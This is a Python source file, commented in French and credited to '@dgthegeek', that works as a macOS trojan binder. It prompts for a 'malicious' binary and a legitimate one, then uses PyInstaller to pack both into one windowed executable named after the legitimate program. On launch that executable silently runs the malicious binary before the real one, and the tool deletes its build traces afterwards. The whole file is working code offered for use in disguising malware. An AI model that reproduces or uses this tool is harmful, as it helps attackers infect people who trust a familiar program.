import os
import subprocess
import shutil

# Fonction pour créer le script d'injection
def create_inject_script(mal_bin, legit_bin):
    # Contenu du script qui sera injecté
    script_content = f"""
import os
import sys

def run_malicious():
    # Chemin complet vers le binaire malveillant
    malicious_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '{os.path.basename(mal_bin)}')
    os.system(f"chmod +x {{malicious_path}}")  # Rend le fichier exécutable
    os.system(malicious_path)  # Exécute le binaire malveillant

def run_legitimate():
    # Chemin complet vers le binaire légitime
    legitimate_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), '{os.path.basename(legit_bin)}')
    os.system(f"chmod +x {{legitimate_path}}")  # Rend le fichier exécutable
    os.system(legitimate_path)  # Exécute le binaire légitime

if __name__ == '__main__':
    run_malicious()
    run_legitimate()
    """
    
    # Écriture du contenu dans un fichier nommé 'inject_script.py'
    with open("inject_script.py", "w") as f:
        f.write(script_content)
    return True

def main():
    # Obtient le répertoire du script en cours d'exécution
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Affiche un en-tête stylisé avec le nom modifié
    print("\033[38;2;255;69;172m" + r'''
       _________                                      ________                          .__    .__ 
 /   _____/ ____   ____   ____   ____   ____    /  _____/  ___________  ____  _____|  |__ |__|
 \_____  \_/ __ \ /    \ /    \_/ __ \ /    \  /   \  ___ /  _ \_  __ \/  _ \/  ___/  |  \|  |
 /        \  ___/|   |  \   |  \  ___/|   |  \ \    \_\  (  <_> )  | \(  <_> )___ \|   Y  \  |
/_______  /\___  >___|  /___|  /\___  >___|  /  \______  /\____/|__|   \____/____  >___|  /__|
        \/     \/     \/     \/     \/     \/          \/                        \/     \/
               By @dgthegeek (macOS version)
    ''' + "\033[0m")

    # Demande à l'utilisateur les chemins des binaires
    mal_bin = input("Enter your \033[31mmalicious\033[0m binary path: ")
    legit_bin = input("Enter your \033[32mlegit\033[0m binary path: ")
    
    # Crée le nom du fichier de sortie
    output_name = os.path.splitext(os.path.basename(legit_bin))[0] + "-injected"

    # Crée le script d'injection
    if not create_inject_script(mal_bin, legit_bin):
        print("Failed to generate inject script. Exiting.")
        return

    # Prépare les arguments pour PyInstaller
    pyinstaller_args = [
        'pyinstaller',
        '--onefile',
        '--windowed',
        f'--add-binary={mal_bin}:.',
        f'--add-binary={legit_bin}:.',
        f'--name={output_name}',
        'inject_script.py'
    ]

    # Exécute PyInstaller
    subprocess.run(pyinstaller_args, check=True)

    # Nettoyage : supprime le script d'injection
    os.remove("inject_script.py")

    # Nettoyage : supprime le fichier .spec
    spec_file = os.path.join(script_dir, f'{output_name}.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)

    # Nettoyage : supprime le dossier build
    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)

    # Déplace le fichier de sortie et supprime le dossier dist
    output_path = os.path.join('dist', output_name)
    if os.path.exists(output_path):
        shutil.move(output_path, script_dir)
        shutil.rmtree('dist')

    # Affiche un message de succès
    print(f"\033[32mInjected binary generated and saved as:\033[0m \033[31m{output_name}\033[0m\n")

# Point d'entrée du script
if __name__ == "__main__":
    main()